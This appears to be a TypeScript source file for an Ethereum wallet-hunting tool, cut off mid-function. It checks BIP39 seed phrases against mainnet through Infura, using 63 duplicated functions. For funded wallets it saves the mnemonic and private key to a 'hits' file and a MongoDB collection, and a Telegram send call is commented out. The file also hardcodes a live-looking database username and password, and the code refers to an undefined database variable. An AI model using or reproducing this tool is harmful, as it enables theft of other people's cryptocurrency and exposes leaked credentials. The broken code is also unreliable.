import { ethers } from "ethers";
import * as crypto from "crypto";
import bip39 from "bip39";
import * as fs from "fs";
import chalk from "chalk";
import { MongoClient } from "mongodb";
const readline = require("readline");

// MongoDB connection string
const uri =
  "mongodb+srv://drxrd:23892389@cluster0.uu2znv3.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
const client = new MongoClient(uri);
const ethToUsd: any = 3000;
let approve = false;

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

// Function to check provided credentials against the credentials array
async function checkCredentials(
  inputUsername: string,
  inputPassword: string
): Promise<boolean> {
  const user = await db.collection('users').findOne({ username: inputUsername, password: inputPassword });
  if(user){
    return true;
  }
  return false;
}

function queryInput(prompt, callback) {
  // Mute stdout to hide the password
  const isPassword = prompt.toLowerCase().includes("password");
  if (isPassword) {
    rl.stdoutMute = true;
    rl._writeToOutput = function _writeToOutput(stringToWrite) {
      if (rl.stdoutMute) rl.output.write("*");
      else rl.output.write(stringToWrite);
    };
  }

  rl.question(prompt, (input) => {
    rl.stdoutMute = false; // Unmute output
    callback(input); // Pass the input to the callback function
  });
}

async function connectDB() {
  try {
    await client.connect();
    // console.log("Connected successfully to MongoDB");
    return client.db("yourDatabaseName"); // Specify your database name here
  } catch (error) {
    return;
  }
}

async function getCommonData(
  balance: any,
  wallet: any,
  transectionCount: any,
  mnemonic: any
) {
  const ethBal = ethers.formatEther(balance.toString());
  const usdBal = parseFloat(ethBal) * ethToUsd;
  // console.log(
  //   chalk.yellow(
  //     `Address:           ${chalk.bold(wallet.address)}\n` +
  //       `Total Transection: ${chalk.bold(transectionCount)}\n` +
  //       `Mnemonic Phrase:   ${chalk.bold(mnemonic)}\n` +
  //       `Private Key:       ${chalk.bold(wallet.privateKey)}\n` +
  //       `Balance:           ${chalk.bold(`${ethBal} ETH`)} & ${chalk.bold(
  //         `${usdBal}USD`
  //       )}`
  //   )
  // );

  const result = `MEMO=${mnemonic},ETH=${ethBal},USD=${usdBal},PvtKey=${wallet.privateKey},TotalTxn=${transectionCount}`;
  // sendMessageToTelegram(result);
  const walletData = {
    mnemonic: mnemonic,
    privateKey: wallet.privateKey,
    address: wallet.address,
    totalTransection: transectionCount,
    ethBalance: ethBal,
    usdBalance: usdBal,
  };

  if (usdBal > 0.1) {
    console.log(chalk.greenBright(result));
    await db.collection("positive_balances").insertOne(walletData);
    fs.appendFileSync("hits.txt", result + "\n", "utf-8");
  }
  fs.appendFileSync("result.txt", result + "\n", "utf-8");
}

async function s1(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}

async function s2(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s3(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s4(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s5(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s6(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s7(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s8(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s9(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s10(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s11(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s12(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s13(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s14(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s15(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s16(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s17(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s18(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s19(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s20(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s21(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s22(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s23(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s24(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s25(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s26(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s27(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s28(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}

async function s29(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}

async function s30(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s31(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s32(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}

async function s33(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s34(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s35(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s36(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s37(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s38(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s39(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s40(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s41(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s42(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s43(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s44(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s45(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s46(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s47(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s48(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s49(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s50(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s51(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s52(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s53(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s54(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s55(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s56(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s57(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s58(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s59(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s60(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s61(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s62(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s63(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
